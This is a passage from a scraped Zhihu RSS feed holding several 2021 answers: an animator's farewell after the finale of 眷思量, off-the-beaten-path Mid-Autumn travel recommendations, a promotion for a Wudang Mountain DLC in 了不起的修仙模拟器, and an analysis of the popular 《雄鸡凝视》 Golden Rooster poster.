data-private-watermark-src=\"v2-acfd8ad157f5b3b7ba28ab5789adeaf6\"></p>\n<p>黑雾中骨琴现身的特效我自己看了都觉得层次不错。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d33fe2d3faa4d9555143bd0432d87374_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d33fe2d3faa4d9555143bd0432d87374\" data-watermark-src=\"v2-466cd90ecdb36ea70f7fa48c24bdf80c\" data-private-watermark-src=\"v2-d005ae3662378f85e8d00c9f7ac18a81\"></p>\n<p>好了，知乎的大结局总结分享就到这里吧。</p>\n<p>非常感谢知乎的邀请和催更团一路陪伴每周努力催更(^з^)-☆，才让我虽然也鸽了好几周，但还是坚持写了不少分享。</p>\n<p>做完这季感慨良多，目前情况评估第二季22年内是不太能上线的。第一季所有制作流程太吃我个人精力了，接下来身上还有很多艰巨任务。。。</p>\n<p>谢谢大家喜欢我的番剧处女作！江湖路远，山高水长，后面找机会再相见（*＾ワ＾*）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-26adce4987a7039815cb720aadc566c4_720w.jpg?rss\" data-rawwidth=\"2022\" data-rawheight=\"1138\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-26adce4987a7039815cb720aadc566c4\" data-watermark-src=\"v2-3bfd4a16f2e3512f49400cf2cb9d9017\" data-private-watermark-src=\"v2-dbff63cac167595f26038c379c832f98\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhao-yu-qing-95-43?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">赵禹晴</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485981245/answer/2121408713?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">53 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/484535382?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《眷思量》第十四集？</a><br><a href=\"http://www.zhihu.com/question/483448611?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《眷思量》第十三集？</a><br>\n","link":"http://www.zhihu.com/question/485981245/answer/2121408713?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中秋假期有哪些小众的城市和地方值得推荐？","date":"2021-09-15 02:42:56","description":"\n<h2>适合自驾的小众旅行地，超级宝藏不想别人知道的那种</h2>\n<h3>北京——爨底下村</h3>\n<p>位于北京市门头沟区斋堂镇下辖村，中国传统村落，建于明代。整个村子不大，有非常典型的老北京四合院，如“财主院，福字院“等。这里的农家菜也很地道。北京的秋天很短，比市区要早上几周，中秋假期去最适合不过了。这里也有一段因断层造成的景观“一线天”，是一处天然关隘，裂谷长达100多米。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-65ff34e5e3b7e9ef0f220f19cc4bcb6d_720w.jpg?rss\" data-rawwidth=\"1918\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-65ff34e5e3b7e9ef0f220f19cc4bcb6d\" data-watermark-src=\"v2-7abad62956bb8d6e55f3b165735eb339\" data-private-watermark-src=\"v2-58981e3e60905a719c6b85c4a7ad4863\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-24f34c9751031bda2fb8eeb7ae502856_720w.jpg?rss\" data-rawwidth=\"1918\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-24f34c9751031bda2fb8eeb7ae502856\" data-watermark-src=\"v2-1761b8850b36d189b0801b133064841b\" data-private-watermark-src=\"v2-90a27a5b10aaac3c2ee42c9a147a6a01\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d9f8c2c20cec701a0b988a1496f9e61c_720w.jpg?rss\" data-rawwidth=\"1918\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d9f8c2c20cec701a0b988a1496f9e61c\" data-watermark-src=\"v2-eee1fee98e0605fa58d18a88058eecd2\" data-private-watermark-src=\"v2-435fed73442a6344f618671118b25d85\"></p>\n<p>当你走进一座村庄，看到叶子散落枝头，风来过，留下柿子沉甸甸坠满了天空，是北方的秋天，没错了。</p>\n<p>推荐住处：北京有关民宿</p>\n<p>特点：轻奢型，很难定。为何称之为小众，该民宿为轻奢型院子为主，外型为四合院。如新建不久的滑梯套院就有200平方米左右，可住4人。住所均很私密，住客大多为北京当地来此过周末的人。</p>\n<h3>河北——秋天的草原天路</h3>\n<p>其实草原天路不是很小众了，离北京车程3小时左右。为何还说很小众呢，那是因为很少人在秋天抵达。话不多说，先放图。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f57178879095ad8cf7777193c36654e5_720w.jpg?rss\" data-rawwidth=\"6016\" data-rawheight=\"4016\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f57178879095ad8cf7777193c36654e5\" data-watermark-src=\"v2-22adb3750e91c49c21d9031f1fcb8cdb\" data-private-watermark-src=\"v2-36e7b1ea763ecca5b0520a9c310f9999\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1c2c45284fa640313555cd9fbb680044_720w.jpg?rss\" data-rawwidth=\"1006\" data-rawheight=\"755\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1c2c45284fa640313555cd9fbb680044\" data-watermark-src=\"v2-ef646a78630cb0df98a3bf6a52066e1a\" data-private-watermark-src=\"v2-8a0d1d78712d1d8e9c2323a533d90049\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-df8ac4544c18810e532de70667bd03ca_720w.jpg?rss\" data-rawwidth=\"911\" data-rawheight=\"511\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-df8ac4544c18810e532de70667bd03ca\" data-watermark-src=\"v2-c242bb19ee56d4ee68e5ac9787cca2b9\" data-private-watermark-src=\"v2-9477dcb781707e03f1fc0ee3451b9d24\"></p>\n<p>草原天路，位于张家口市张北县和崇礼区的交界处，西起尚义县城南侧的大青山（国家级森林公园），东至崇礼县桦皮岭处，是连接崇礼滑雪区、赤城温泉区、张北草原风景区、白龙洞风景区、大青山风景区的一条重要通道，也是中国大陆十大最美丽的公路之一。</p>\n<p>其实从桦皮岭入口进去后，有成片成片的森林，阳光从缝隙里倾泻而下，像日光瀑布，铺在地上金光闪闪。这里的秋天很短也很长，因为即使秋天早已过去，当你开着车经过雪霜，也会突然再和金色相遇。秋天和冬天的草原天路，是被人忽视的存在。当然如果你能错开节假日，或许会更好。</p>\n<h3>贵州黔东南——牛耕部落</h3>\n<p>牛耕部落，坐落于贵州省黔东南黎平县尚重镇洋洞村，这里是中华农耕文明保存最为完整的遗存地，传统“牛耕”是世界上最古老的生态循环模式，洋洞是传承“牛耕”文化最为完整的山村，该区域的梯田上建有很多牛棚，农户的耕牛就喂养在高山梯田牛棚里。</p>\n<p>这里是真正的小众旅行地了。当你自驾行至山路，一路颠簸之后，抵达牛耕部落，顿觉豁然开朗，一切都值得。这种感受至今印象深刻。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-98706c7b731a746baefc9dbf73b966a3_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-98706c7b731a746baefc9dbf73b966a3\" data-watermark-src=\"v2-113444389967e6387459ee9f3f7bcd57\" data-private-watermark-src=\"v2-f6a423b7f6976f29383524c67f1b9922\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3e02349ed82f51cfada2993baad78f4d_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"3376\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3e02349ed82f51cfada2993baad78f4d\" data-watermark-src=\"v2-abd652204ab4147a2a94beae1fd18543\" data-private-watermark-src=\"v2-70803706290548cd6ef64a71962d1282\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-82d528d1867e1c056fa54976ba193130_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"3376\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-82d528d1867e1c056fa54976ba193130\" data-watermark-src=\"v2-651a6e812519fc68cff29c3fa999c4b0\" data-private-watermark-src=\"v2-784db6c97e824fe9f9a4d8cff51c7159\"></p>\n<p>住宿推荐：牛耕部落</p>\n<p>推荐理由：没有其他住处了。这里是建在耕田之上的小木屋，居住环境很好。每一栋小木屋都以节气命名。早晨醒来看一眼窗外的景色，人生至此得以治愈。</p>\n<a href=\"https://www.zhihu.com/zvideo/1389213615417888768\">「贵州vlog03」探秘黔东南牛耕部落，割草喂牛、吹芦笙，是向往的生活呀</a><h3>福建——桐木村</h3>\n<p><img src=\"https://pic1.zhimg.com/v2-0a2d4809b57fd2f92e627434ef2033a2_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0a2d4809b57fd2f92e627434ef2033a2\" data-watermark-src=\"v2-a4112a9a10dc22dc7fa2a4be2966cfd2\" data-private-watermark-src=\"v2-7bf162fe7080c3ab1efbe525c4806602\"></p>\n<p>很多人去武夷山，只会去桐木关，其实桐木关只是一个景点，进村子里的话，还需要另行报备。也有一些武夷山组织的桐木关一日游，那样就无法感受静谧的山林生活。</p>\n<a href=\"https://www.zhihu.com/zvideo/1377988415212847104\">福建武夷山桐木村，外国人禁止入内，红茶却从这儿走向了世界</a><p>也有传说，桐木村的蛇比人还多，而且说桐木村的空气要比其他地方甜三度，以上均说明这里的自然环境原始，没有经过污染。</p>\n<p>武夷山桐木村，必须住宿才能被允许进入的秘境。需要提前预定村子里的民宿，民宿均为当地人，会提前和关口报备车辆和姓名，进入时签字即可。一般这里的民宿都是做茶叶生意的，在这儿没有游玩项目，就是接近大自然的日子，采茶制茶喝茶～</p>\n<p>推荐民宿：南平桐木村尝百茶山舍客栈</p>\n<p>旅行这件事，以及目的地是否小众，是否是自己喜欢的，都要因人而异。以上均为博主本人去过且比较喜欢的几个，推荐给大家。</p>\n<p>去了之后如果你也喜欢，是我之荣幸。如果不喜欢，那就快把我忘记。</p>\n<p>提前，祝各位中秋快乐。玩得开心。人生最紧要就是开心嘛～～</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/susutuotuo?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">素素拓拓的旅行派</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484009933/answer/2121276226?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">6 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/438328825?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你愿意「就地过年」吗？你所在的城市有什么小众的值得过年去的地方？</a><br><a href=\"http://www.zhihu.com/question/435315986?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年春节不回家国内旅行哪个城市比较适合？（一个女生）?</a><br>\n","link":"http://www.zhihu.com/question/484009933/answer/2121276226?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国产游戏《了不起的修仙模拟器》DLC「武当仙踪」已解锁，体验如何？","date":"2021-09-15 02:33:55","description":"\n<p>将游戏中融入传统历史文化，打造游戏国潮IP在近两年已经不是新鲜事。武当山是中国著名的道教圣地，自古便有“太岳”“玄岳”“大岳”之圣名，亦是玄天真武大帝的人间道场，被称为“亘古无双胜境，天下第一仙山”。</p>\n<p><br></p>\n<p>2020年底，武当山文化创意有限公司正式成立。公司内部有一个《了不起的修仙模拟器》的老玩家，在综合了武当山官方文创的发展规划后，有了和游戏合作的想法。很快，武当山官方文创和《了不起的修仙模拟器》取得了联系，在了解后，《了不起的修仙模拟器》团队也对武当山及武当博物馆IP产生了浓厚的兴趣。2021年1月，团队成员亲自走访武当山景区，重点游览参观了武当山金顶、南岩宫、紫霄宫以及武当博物馆，对武当山的历史和文化有了更深刻的认识。武当山拥有的悠久历史和文化底蕴，独特的道家文化和真武修真升仙的传说与《了不起的修仙模拟器》模拟修仙游戏的定位不谋而合，武当山文创和《了不起的修仙模拟器》的合作也就顺理成章达成了。</p>\n<p><br></p>\n<p>在全新的扩展内容中，《了不起的修仙模拟器》围绕武当山众多深刻而有趣的文化符号制作了大量的内容：</p>\n<p><br></p>\n<p><b>新DLC《武当仙踪》增加全新的门派：武当山。</b>以武当山的最为著名的几大景区为原型，将武当山绝美的仙境盛景复刻到游戏中，共计四个全新地图：武当金顶，南岩宫，复真观，紫霄宫。除此之外，游戏中还还原了武当山最著名的景观和建筑，如武当金顶的金殿，云海，复真观的九曲黄河墙，南岩宫的临崖绝壁，龙头香，紫霄宫的赑屃驼碑等……</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-efcf2b4a39ef1a65ffa2770aad0e12be_720w.png?rss\" data-caption=\"金顶金殿\" data-size=\"normal\" data-rawwidth=\"1044\" data-rawheight=\"1610\" data-watermark=\"original\" data-original-src=\"v2-efcf2b4a39ef1a65ffa2770aad0e12be\" data-watermark-src=\"v2-b03b8631c83264354407c48ca10fb3a4\" data-private-watermark-src=\"v2-4fa7f18929c9748da7a44f68a90c6adf\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-087a9af469f1e49b2b3cf35cc6c988aa_720w.png?rss\" data-caption=\"金顶云海\" data-size=\"normal\" data-rawwidth=\"1288\" data-rawheight=\"1463\" data-watermark=\"original\" data-original-src=\"v2-087a9af469f1e49b2b3cf35cc6c988aa\" data-watermark-src=\"v2-7bfcddf088b894f5dcf0a90f83969ea9\" data-private-watermark-src=\"v2-538c56036dc4473bd4a222f33c287052\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2dc8af43aaf2b58a018024ff12a57a60_720w.png?rss\" data-caption=\"复真观九曲黄河墙\" data-size=\"normal\" data-rawwidth=\"652\" data-rawheight=\"1012\" data-watermark=\"original\" data-original-src=\"v2-2dc8af43aaf2b58a018024ff12a57a60\" data-watermark-src=\"v2-cb979c344699c9472f5550a6b2a08122\" data-private-watermark-src=\"v2-96f8f84c4de3d1b6caaba9e37f53f249\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6c93355f87b2fa0444aafee333b5a845_720w.png?rss\" data-caption=\"南岩宫龙头香\" data-size=\"normal\" data-rawwidth=\"596\" data-rawheight=\"873\" data-watermark=\"original\" data-original-src=\"v2-6c93355f87b2fa0444aafee333b5a845\" data-watermark-src=\"v2-50fe3af4eca6b03851098e52e15c2c9d\" data-private-watermark-src=\"v2-92fd0209783178b6877ae56f313b6bdb\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-68091ab48d7b1d609c8294786bba588c_720w.png?rss\" data-caption=\"紫霄宫门\" data-size=\"normal\" data-rawwidth=\"1015\" data-rawheight=\"1438\" data-watermark=\"original\" data-original-src=\"v2-68091ab48d7b1d609c8294786bba588c\" data-watermark-src=\"v2-6c4f6b6f3568fb106901d2b5424382c1\" data-private-watermark-src=\"v2-efaf5bc6d2b22d7a2c2911ae1c5c7d4e\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f27173f9e815cc2946652f3a9035a117_720w.png?rss\" data-caption=\"紫霄宫御碑松林\" data-size=\"normal\" data-rawwidth=\"1100\" data-rawheight=\"1455\" data-watermark=\"original\" data-original-src=\"v2-f27173f9e815cc2946652f3a9035a117\" data-watermark-src=\"v2-41da693dcaee270d287ef48b82e0becf\" data-private-watermark-src=\"v2-578356a1ee6be2c6699e03c60f17687f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9555c0c8403fcd0b39d42b0adda829a4_720w.png?rss\" data-caption=\"紫霄宫玄天真武大帝像\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"742\" data-watermark=\"original\" data-original-src=\"v2-9555c0c8403fcd0b39d42b0adda829a4\" data-watermark-src=\"v2-2e56e97a06a32cd9f0a80f2327e8f9c0\" data-private-watermark-src=\"v2-5b841149a690e923fbfeb129bbd9873b\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1b33a0858d9dbe7ee1de083bf9ad7464_720w.png?rss\" data-caption=\"玄天上帝圣旨牌\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"854\" data-watermark=\"original\" data-original-src=\"v2-1b33a0858d9dbe7ee1de083bf9ad7464\" data-watermark-src=\"v2-d062299e1c58d40ddb7cd690eb65e957\" data-private-watermark-src=\"v2-27a9c68ddf60b0248f55bd14f024f8c2\"></p>\n<p><br></p>\n<p><b>伴随着武当山门派一同登场的还有全新功法《玄天真武两仪妙道》。</b>这是武当山的玄天真武荡魔祖师所传道统，此功法围绕“阴阳”的概念而制作，相比此前的功法拥有独特的机制设计。同时，<b>中国传统文化四大灵兽之一的玄武，也在这个DLC中登场</b>。龟蛇动静之势与阴阳太极之意相合，自古便是武当山文化中最重要的组成部分。玄武将作为武当山专属灵宠，供玩家驱使。</p>\n<p><br></p>\n<p>此外，<b>在《武当仙踪》DLC里，还</b>围绕武当的文化还做了非常多的细节。</p>\n<h3><b>·新增武当山专属灵宠：玄武</b></h3>\n<p>作为中国传统文化四大灵兽，玄武和武当山有不解之缘。龟蛇动静之势与阴阳太极之意相合，自古便是武当山文化中最重要的组成部分。</p>\n<h3><b>·新增武当山专属武器：拂尘</b></h3>\n<p>拂尘是道教经典的法器，仙风道骨的道人挥动一柄拂尘飘然出尘的形象更是深入人心，现在在新的DLC，你也可以为自己的角色装备这一把增气质的武器了。</p>\n<h3><b>·新增武当山专属武器：道剑</b></h3>\n<p>道门所用的法剑，与凡俗之兵器不同。道家具有更加庄重的仪式感与灵性，更适合法宝的炼制。</p>\n<h3><b>·新增武当山专属灵药：黄精</b></h3>\n<p>武当山盛产之物，此物不光可服之充饥，长久服用更可强身健体益寿延年。如今武当盛产的黄精也加入了修仙的世界，必可为修行提供更多助益。</p>\n<h3><b>·新增武当山专属丹药：五气辟谷丸/三花黄精丸</b></h3>\n<p>武当山秘传的丹药，自古为武当山修行道人不传之秘，有非常神奇的灵效。随着武当仙境的现世，这些灵药也为大家所知。</p>\n<p>赶快到《了不起的修仙模拟器》全新DLC《武当仙踪》里来体验一番，感受武当山的极致景色吧。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wu-dang-shan-16?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">武当山</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/483819782/answer/2121630624?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">5 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/309270921?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">了不起的修仙模拟器有哪些小技巧？</a><br><a href=\"http://www.zhihu.com/question/309084194?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《了不起的修仙模拟器》的营销手段有哪些？</a><br>\n","link":"http://www.zhihu.com/question/483819782/answer/2121630624?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何看待第34届金鸡奖海报设计大赛网络投票中，《雄鸡凝视》目前投票第一？","date":"2021-09-15 02:20:13","description":"\n<p><b><i>很多人投的是鸡，其实表达的是自己</i></b></p>\n<p><br></p>\n<p>截至9月5日，第34届中国电影金鸡奖海报设计大赛网络人气投票结束，<b>《雄鸡凝视》最终在100强角逐中以领先第二名超4万票的优势C位出道。</b></p>\n<p>《雄鸡凝视》为何获得如此高的人气，让小艺来为你分析~</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6f341f652f46c90860a13826d65cacf3_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"820\" data-watermark=\"original\" data-original-src=\"v2-6f341f652f46c90860a13826d65cacf3\" data-watermark-src=\"v2-c25bedf64fffbf950a93fa2dc9e4144b\" data-private-watermark-src=\"v2-285f6177a0b7122c7153f2ff2b392a8e\"></p>\n<p>《雄鸡凝视》设计海报</p>\n<h2><b>画风清奇，“雄鸡”脱颖而出</b></h2>\n<p>今年，主办方把主视觉海报的设计权交给大众，从国内外共征集1610件作品，由专业评审从中选出100幅入围作品，由大众进行票选，堪称“百鸡争鸣”。收到的投稿作品中，平面作品约占70%、立体作品约有8%、手绘插画约有5%、抽象夸张和中国风作品约有3%等。</p>\n<p><b>部分入围海报</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-24b4551f2984595c9583bae8118ae62e_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"961\" data-watermark=\"original\" data-original-src=\"v2-24b4551f2984595c9583bae8118ae62e\" data-watermark-src=\"v2-3c1482c95d6c7783082f67063627c36f\" data-private-watermark-src=\"v2-75340c8100bcf7516692feb3c3fc3ee7\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6510b83a36c549cb012e291a9fe0fe77_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"764\" data-rawheight=\"977\" data-watermark=\"original\" data-original-src=\"v2-6510b83a36c549cb012e291a9fe0fe77\" data-watermark-src=\"v2-c05d63cb47bd447924cfa6c8bcde5352\" data-private-watermark-src=\"v2-5a843a26e1d7f692f291e89c3c54e876\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3563ade134952aff79d615a033c6bbe0_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"961\" data-watermark=\"original\" data-original-src=\"v2-3563ade134952aff79d615a033c6bbe0\" data-watermark-src=\"v2-fcd22cdd0ca6a289f9704ddcb8359e57\" data-private-watermark-src=\"v2-33941e2595fd568cc75d2b574e4ae3a6\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1a95e671b67b7f0a9a26570073d9b2ea_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"914\" data-watermark=\"original\" data-original-src=\"v2-1a95e671b67b7f0a9a26570073d9b2ea\" data-watermark-src=\"v2-0263e55a3af92c5dd83109e2bc16190c\" data-private-watermark-src=\"v2-fccc24e57b38fd1ad416244f69bed7f7\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-17fb3dcb689ff14b4681eed2c824eb20_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"1071\" data-watermark=\"original\" data-original-src=\"v2-17fb3dcb689ff14b4681eed2c824eb20\" data-watermark-src=\"v2-3f5b89b7dc4cb3e3f4e45faae6c103b8\" data-private-watermark-src=\"v2-876430442b8051d98720f31d9fb6628a\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7a54522970b92dd8c7ce0d136d517ed6_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"961\" data-watermark=\"original\" data-original-src=\"v2-7a54522970b92dd8c7ce0d136d517ed6\" data-watermark-src=\"v2-eacba6f127a3d273e5bb07d43a8fb6ba\" data-private-watermark-src=\"v2-729098e409adc8cb99096037d3ab542d\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-feed4cf7baa464527131c1302e974b8b_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"962\" data-watermark=\"original\" data-original-src=\"v2-feed4cf7baa464527131c1302e974b8b\" data-watermark-src=\"v2-e02fa06c11dc4fee9fd0809e0f21ddcb\" data-private-watermark-src=\"v2-afbb890559d2e031fc061d6984ddf4ae\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e244d6017360127687840e626b383aba_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"820\" data-watermark=\"original\" data-original-src=\"v2-e244d6017360127687840e626b383aba\" data-watermark-src=\"v2-4c990be53e7e32ff0614127d3422da89\" data-private-watermark-src=\"v2-84ca27bd065685069fbcf6630f772649\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9d5138154908f99ea007547b0eb3f049_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"820\" data-watermark=\"original\" data-original-src=\"v2-9d5138154908f99ea007547b0eb3f049\" data-watermark-src=\"v2-272b18469342c5ce6aa246e245ff4af9\" data-private-watermark-src=\"v2-2c1a8179f8f19ea3c47588a89b34e817\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-95fa4069c514a9255056404e8d233521_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"962\" data-watermark=\"original\" data-original-src=\"v2-95fa4069c514a9255056404e8d233521\" data-watermark-src=\"v2-470218cbe68c8fd2640544103fe8ac5b\" data-private-watermark-src=\"v2-babd7e2253b6e658a73a088d60830f40\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ccdf0fa4cdf0d1f6b07e65e026cd943b_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"961\" data-watermark=\"original\" data-original-src=\"v2-ccdf0fa4cdf0d1f6b07e65e026cd943b\" data-watermark-src=\"v2-1cbb27c5c551555463225a46c724c86b\" data-private-watermark-src=\"v2-5deea348123cbfd8d5bca7984f490e58\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bc16a92d0a45c6e32c40c4506a2cffb1_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"764\" data-rawheight=\"977\" data-watermark=\"original\" data-original-src=\"v2-bc16a92d0a45c6e32c40c4506a2cffb1\" data-watermark-src=\"v2-3310c9f35593b4bdd106b7f77d6ff144\" data-private-watermark-src=\"v2-32387f70892e74246c85f58e3bc16076\"></p>\n<p><br></p>\n<p>其中呼声最高的手绘海报《雄鸡凝视》描绘了一只神态表情刻画得惟妙惟肖、神气骄傲的五彩大雄鸡。因其眼神和喙部描画生动，配色大胆，搭配极具线条感，跳脱以往海报的严肃感，颠覆大众想象，表现出一种亲和力，不少网友评价<b>“当你凝视鸡，鸡也在凝视你”“感觉很特别，眼前一亮”“独特而绚烂”“每根线条都很讲究”。</b></p>\n<p>本届海报大赛评委、中国电影家协会分党组副书记、秘书长闫少非是力推这幅海报入围的专家之一，对这幅作品印象深刻，他表示，“评选入围海报的过程大概分了有七八轮，第一轮评选出的几十张作品里就有它。我第一眼看到它的时候，就觉得它足够特别。” “我觉得它在看似简单（的形象）中体现了设计者的功底，是一个具有严肃性的作品，同时也让观众感到亲近。”</p>\n<h2><b>议程设置，“雄鸡”热度提升</b></h2>\n<p><b>传播学中的议程设置理论</b>认为，大众媒介往往不能决定人们对某一事件或意见的具体看法，但是可以通过提供信息和安排相关的议题来有效地左右人们关注某些事实和意见，以及他们对议论的先后顺序。新媒体时代，议程设置主体也呈现出多元化趋势。</p>\n<p><b>互联网端口传播的引爆，实现了公众对热点话题的关注向组织议题的关注的转变。</b>主流媒体、微博大V等发布关于金鸡奖海报《雄鸡凝视》相关微博热门话题 #雄鸡凝视作者回应爆红# #金鸡奖海报票选领跑作者回应#，自媒体发布《玩脱了！金鸡奖海报引发“视觉厮杀”，手绘鬼才脱颖而出！领先上万票，堪称海报界的毕加索！》《你一票我一票，雄鸡凝视要出道》等文章，赋予“雄鸡”不同程度的显著性，激发网友兴趣，引发更多网友关注。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-456eb52cc497a33d9b6f32bab9bf0dc7_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"978\" data-watermark=\"original\" data-original-src=\"v2-456eb52cc497a33d9b6f32bab9bf0dc7\" data-watermark-src=\"v2-01bffc9a202320524dc45eac79baca92\" data-private-watermark-src=\"v2-b1f4eb5780b4681b72beb9735434265c\"></p>\n<p>微博、抖音截图《雄鸡凝视》在网络爆火，成为各大平台出镜率最高的一只“鸡”，人们也开始展开它究竟是“美”还是“丑”的讨论。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-92c913635115a192738c0743d3f8ae8b_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"828\" data-rawheight=\"930\" data-watermark=\"original\" 